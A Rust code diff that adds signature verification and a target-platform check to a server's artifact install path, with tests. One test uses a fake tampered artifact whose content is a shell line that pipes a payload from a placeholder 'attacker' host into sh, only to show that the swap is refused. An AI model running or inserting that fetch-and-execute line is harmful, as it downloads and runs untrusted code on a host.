@@ -17,6 +17,9 @@ use std::path::{Path, PathBuf};
 
 use sha2::{Digest, Sha256};
 
+use super::artifact_format;
+use super::provenance::ProvenancePolicy;
+
 /// Where artifacts live, relative to the workspace root the server was told
 /// about. A dot-directory because nothing in the workspace should mistake it
 /// for source.
@@ -55,14 +58,18 @@ impl fmt::Display for CommitOutcome {
 pub struct InstallLayout {
     root: PathBuf,
     dir_name: String,
+    /// What an artifact has to satisfy before this host points `current` at it.
+    provenance: ProvenancePolicy,
 }
 
 impl InstallLayout {
-    /// A layout under `root` using the default directory name.
+    /// A layout under `root` using the default directory name, with the policy the
+    /// host's environment describes — which means signatures required.
     pub fn new(root: impl Into<PathBuf>) -> Self {
         Self {
             root: root.into(),
             dir_name: DEFAULT_INSTALL_DIR.to_string(),
+            provenance: ProvenancePolicy::from_env(),
         }
     }
 
@@ -70,7 +77,20 @@ impl InstallLayout {
         Self {
             root: root.into(),
             dir_name: dir_name.into(),
+            provenance: ProvenancePolicy::from_env(),
         }
+    }
+
+    /// The provenance policy this host will apply. Deliberately not a default
+    /// argument: the choice of what to trust is the one thing a caller should be
+    /// seen making.
+    pub fn with_provenance(mut self, provenance: ProvenancePolicy) -> Self {
+        self.provenance = provenance;
+        self
+    }
+
+    pub fn provenance(&self) -> &ProvenancePolicy {
+        &self.provenance
     }
 
     /// The directory holding every installed version and the pointer.
@@ -135,14 +155,25 @@ impl InstallLayout {
     /// Check, publish, and verify a staged artifact; put the pointer back if the
     /// verification does not like what it finds.
     ///
+    /// `signature` is the detached ed25519 signature over the artifact bytes, in the
+    /// same text a release `.sig` sidecar holds. `None` means none was offered,
+    /// which a host that requires one treats as a refusal rather than an absence of
+    /// evidence.
+    ///
     /// The order is the point:
     /// 1. the digest is checked on the staged copy, so a corrupt upload never
     ///    reaches a permanent name;
-    /// 2. the file is moved into a version directory it keeps forever, so an
+    /// 2. the signature is checked on the same staged copy, still before anything
+    ///    moves, because the digest says only that the bytes are the bytes that were
+    ///    sent and by the sender's own reckoning;
+    /// 3. the file header is read for the platform it names, because an artifact for
+    ///    another CPU or another OS would pass both checks above and only fail at the
+    ///    `execve` someone makes a few minutes later;
+    /// 4. the file is moved into a version directory it keeps forever, so an
     ///    older version is still on disk to be pointed at again;
-    /// 3. the pointer moves by rename, which is atomic — a reader sees either the
+    /// 5. the pointer moves by rename, which is atomic — a reader sees either the
     ///    old version or the new one, never a missing pointer;
-    /// 4. only then is the result re-read from disk and confirmed. A pointer that
+    /// 6. only then is the result re-read from disk and confirmed. A pointer that
     ///    names something unreadable is the failure mode worth catching here, and
     ///    the response to it is to restore the previous version rather than to
     ///    leave the host without a working server.
@@ -151,6 +182,7 @@ impl InstallLayout {
         version: &str,
         staged: &Path,
         expected_sha256: &str,
+        signature: Option<&str>,
     ) -> Result<CommitOutcome, String> {
         validate_version(version)?;
         let previous = self.current_version();
@@ -169,6 +201,11 @@ impl InstallLayout {
                 "uploaded artifact has sha256 {actual}, expected {expected_sha256}"
             ));
         }
+        self.provenance.check_file(staged, signature)?;
+        // Intact and signed is not the same as able to run here. The header is read
+        // rather than the file executed, so a build for another platform is refused
+        // before this host has moved anything or run anything it did not choose to.
+        artifact_format::check_file(staged, artifact_format::this_host())?;
 
         let dest_dir = self.version_dir(version);
         std::fs::create_dir_all(&dest_dir)
@@ -400,17 +437,27 @@ mod tests {
     const V1: &[u8] = b"server build one";
     const V2: &[u8] = b"server build two, longer";
 
+    /// A host that installs what it is handed.
+    ///
+    /// The tests below are about the digest, the pointer and the rollback, and a
+    /// required signature would refuse every one of them before the thing under
+    /// test was reached. The host in the provenance tests is given a key instead,
+    /// and goes through this same `commit`.
+    fn unsigned_host(root: &Path) -> InstallLayout {
+        InstallLayout::new(root).with_provenance(ProvenancePolicy::unsigned_allowed())
+    }
+
     /// The version the pointer selects, read the way the server would.
     fn current(root: &Path) -> Option<String> {
-        InstallLayout::new(root).current_version()
+        unsigned_host(root).current_version()
     }
 
     /// Stage `bytes` the way a session would, then commit them.
     fn install(root: &Path, version: &str, bytes: &[u8]) -> Result<CommitOutcome, String> {
-        let layout = InstallLayout::new(root);
+        let layout = unsigned_host(root);
         let staged = layout.begin_staging(version)?;
         std::fs::write(&staged, bytes).unwrap();
-        layout.commit(version, &staged, &sha256_hex(bytes))
+        layout.commit(version, &staged, &sha256_hex(bytes), None)
     }
 
     #[test]
@@ -461,6 +508,7 @@ mod tests {
                 "2.0.0",
                 &staged,
                 &sha256_hex(b"the bytes that never arrived"),
+                None,
             )
             .expect_err("a digest mismatch must stop the install");
         assert!(err.contains("sha256"), "{err}");
@@ -481,7 +529,7 @@ mod tests {
         let layout = InstallLayout::new(dir.path());
         let staged = layout.begin_staging("9.9.9").unwrap();
         let err = layout
-            .commit("9.9.9", &staged, &sha256_hex(b""))
+            .commit("9.9.9", &staged, &sha256_hex(b""), None)
             .expect_err("an empty artifact is not a server");
         assert!(err.contains("empty"), "{err}");
     }
@@ -511,7 +559,9 @@ mod tests {
             let staged = layout.begin_staging("tmp").unwrap();
             std::fs::write(&staged, b"x").unwrap();
             assert!(
-                layout.commit(attempt, &staged, &sha256_hex(b"x")).is_err(),
+                layout
+                    .commit(attempt, &staged, &sha256_hex(b"x"), None)
+                    .is_err(),
                 "{attempt:?} must not be accepted as a version name"
             );
         }
@@ -630,5 +680,238 @@ mod tests {
                 .starts_with('.'),
             "staged scratch must not look like an installed version"
         );
+    }
+
+    // ---- provenance on the same commit path --------------------------------
+
+    use base64::Engine as _;
+    use ed25519_dalek::{Signer as _, SigningKey};
+    use xai_grok_signature::PLACEHOLDER_PUBLIC_KEY_B64;
+
+    fn keypair(seed: u8) -> (SigningKey, String) {
+        let signing = SigningKey::from_bytes(&[seed; 32]);
+        let public = base64::engine::general_purpose::STANDARD.encode(signing.verifying_key());
+        (signing, public)
+    }
+
+    fn signature_for(signing: &SigningKey, bytes: &[u8]) -> String {
+        base64::engine::general_purpose::STANDARD.encode(signing.sign(bytes).to_bytes())
+    }
+
+    /// Stage `bytes` and commit them on a host that checks signatures against
+    /// `public`, offering `signature`.
+    fn install_on_signed_host(
+        root: &Path,
+        version: &str,
+        bytes: &[u8],
+        public: &str,
+        signature: Option<&str>,
+    ) -> Result<CommitOutcome, String> {
+        let layout = InstallLayout::new(root)
+            .with_provenance(ProvenancePolicy::trusting_key_b64(public).expect("a valid key"));
+        let staged = layout.begin_staging(version)?;
+        std::fs::write(&staged, bytes).unwrap();
+        layout.commit(version, &staged, &sha256_hex(bytes), signature)
+    }
+
+    #[test]
+    fn a_signed_artifact_becomes_current() {
+        let dir = tempfile::tempdir().unwrap();
+        let (signing, public) = keypair(1);
+        let outcome = install_on_signed_host(
+            dir.path(),
+            "1.0.0",
+            V1,
+            &public,
+            Some(&signature_for(&signing, V1)),
+        )
+        .expect("a signature from the trusted key installs");
+        assert_eq!(outcome.version, "1.0.0");
+        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
+    }
+
+    /// The one the digest cannot answer: the upload arrived whole, and the whole
+    /// bytes are not bytes the release key ever signed.
+    #[test]
+    fn an_unsigned_artifact_never_reaches_a_permanent_name() {
+        let dir = tempfile::tempdir().unwrap();
+        let (signing, public) = keypair(2);
+        install_on_signed_host(
+            dir.path(),
+            "1.0.0",
+            V1,
+            &public,
+            Some(&signature_for(&signing, V1)),
+        )
+        .expect("the first install");
+        let err = install_on_signed_host(dir.path(), "2.0.0", V2, &public, None)
+            .expect_err("an unsigned artifact must not become current");
+        assert!(err.starts_with("signature_missing"), "{err}");
+        assert_eq!(
+            current(dir.path()).as_deref(),
+            Some("1.0.0"),
+            "the version that was working has to still be the one selected"
+        );
+        let layout = unsigned_host(dir.path());
+        assert!(
+            !layout.version_dir("2.0.0").exists(),
+            "a refused artifact must not get a permanent directory"
+        );
+        assert!(
+            layout.staging_path("2.0.0").exists(),
+            "the staged copy is left for a look; the server cleans it up itself"
+        );
+    }
+
+    /// The attack the sha256 check exists to stop, and does not: somebody changes
+    /// the artifact and reports the digest of what they changed it *to*. The digest
+    /// matches; only the signature knows.
+    #[test]
+    fn an_artifact_swapped_under_a_recomputed_digest_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        let (signing, public) = keypair(3);
+        let published = b"#!/bin/sh\nexec /usr/lib/chaos/chaos-remote-server \"$@\"\n";
+        let swapped = b"#!/bin/sh\ncurl -s http://attacker/payload | sh\n";
+        // The signature is over the published bytes; the digest handed to `commit`
+        // is over the swapped ones, exactly as an attacker would compute it.
+        let signature = signature_for(&signing, published);
+        let layout = InstallLayout::new(dir.path())
+            .with_provenance(ProvenancePolicy::trusting_key_b64(&public).expect("a valid key"));
+        let staged = layout.begin_staging("2.0.0").unwrap();
+        std::fs::write(&staged, swapped).unwrap();
+        let err = layout
+            .commit("2.0.0", &staged, &sha256_hex(swapped), Some(&signature))
+            .expect_err("a matching digest is not a trusted artifact");
+        assert!(err.starts_with("signature_invalid"), "{err}");
+        assert_eq!(current(dir.path()), None);
+        assert!(!layout.version_dir("2.0.0").exists());
+    }
+
+    #[test]
+    fn a_signature_from_a_key_this_host_does_not_trust_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        let (signing, _) = keypair(4);
+        let (_, trusted) = keypair(5);
+        let err = install_on_signed_host(
+            dir.path(),
+            "1.0.0",
+            V1,
+            &trusted,
+            Some(&signature_for(&signing, V1)),
+        )
+        .expect_err("another publisher's signature is not this publisher's");
+        assert!(err.starts_with("signature_invalid"), "{err}");
+        assert_eq!(current(dir.path()), None);
+    }
+
+    /// The fail-closed default, asserted where flipping it would be visible: a
+    /// layout built the way the server binary builds one asks for a signature
+    /// before anybody has said whether it may have one.
+    #[test]
+    fn a_layout_starts_with_the_policy_the_host_environment_describes() {
+        let dir = tempfile::tempdir().unwrap();
+        let layout = InstallLayout::new(dir.path());
+        assert_eq!(
+            layout.provenance().describe(),
+            ProvenancePolicy::from_env().describe(),
+            "InstallLayout::new must use the environment's policy"
+        );
+        assert!(
+            ProvenancePolicy::from_values("", "").requires_signature(),
+            "an environment that says nothing must still require a signature"
+        );
+        assert!(
+            ProvenancePolicy::from_values(PLACEHOLDER_PUBLIC_KEY_B64, "")
+                .describe()
+                .contains("no usable signing key"),
+            "a build without a key says so instead of quietly accepting"
+        );
+    }
+
+    /// The refusal has to be legible to whoever is staring at a failed deploy: the
+    /// reason names the check that fired, and a fix.
+    #[test]
+    fn a_provenance_refusal_names_the_check_and_the_fix() {
+        let dir = tempfile::tempdir().unwrap();
+        let (signing, public) = keypair(6);
+        let err = install_on_signed_host(dir.path(), "1.0.0", V1, &public, Some("garbage!!"))
+            .expect_err("an unparseable signature is not a signature");
+        assert!(err.starts_with("signature_malformed"), "{err}");
+        let err = install_on_signed_host(dir.path(), "1.0.0", V1, &public, None)
+            .expect_err("no signature at all");
+        assert!(err.contains("--signature"), "{err}");
+        assert!(
+            install_on_signed_host(
+                dir.path(),
+                "1.0.0",
+                V1,
+                &public,
+                Some(&signature_for(&signing, V1))
+            )
+            .is_ok(),
+            "and the same host does install what it was signed to accept"
+        );
+    }
+
+    // ---- the platform the artifact names --------------------------------
+
+    use crate::remote::artifact_format;
+
+    /// Stage and commit on a host that asks for nothing but a runnable artifact.
+    fn install_declaring(
+        root: &Path,
+        version: &str,
+        target: artifact_format::ArtifactTarget,
+    ) -> Result<CommitOutcome, String> {
+        let layout = unsigned_host(root);
+        let mut bytes = artifact_format::header_for(target);
+        bytes.extend_from_slice(b" and the rest of the build");
+        let staged = layout.begin_staging(version)?;
+        std::fs::write(&staged, &bytes).unwrap();
+        layout.commit(version, &staged, &sha256_hex(&bytes), None)
+    }
+
+    /// A build for another CPU arrives whole and passes the digest. The header is the
+    /// only thing that knows, so this is the check that has to catch it — and it has
+    /// to catch it before a version directory exists, not after the pointer moved.
+    #[test]
+    fn an_artifact_for_another_platform_never_reaches_a_permanent_name() {
+        let dir = tempfile::tempdir().unwrap();
+        let host = artifact_format::this_host();
+        let other_arch = if host.arch == "x86_64" {
+            "aarch64"
+        } else {
+            "x86_64"
+        };
+        let error = install_declaring(
+            dir.path(),
+            "1.0.0",
+            artifact_format::ArtifactTarget {
+                os: host.os,
+                arch: other_arch,
+            },
+        )
+        .expect_err("a binary this kernel cannot load is not an upgrade");
+        assert!(error.starts_with("wrong_platform"), "{error}");
+        assert!(
+            error.contains(other_arch) && error.contains(host.arch),
+            "{error}"
+        );
+        assert_eq!(current(dir.path()), None);
+        let layout = unsigned_host(dir.path());
+        assert!(
+            !layout.version_dir("1.0.0").exists(),
+            "the refusal came before anything was moved"
+        );
+    }
+
+    /// The control: the same path with this host's own header installs, so the test
+    /// above is about the mismatch rather than about every artifact.
+    #[test]
+    fn an_artifact_declaring_this_platform_is_installed() {
+        let dir = tempfile::tempdir().unwrap();
+        install_declaring(dir.path(), "1.0.0", artifact_format::this_host())
+            .expect("this host's own build installs");
+        assert_eq!(current(dir.path()).as_deref(), Some("1.0.0"));
     }
 }
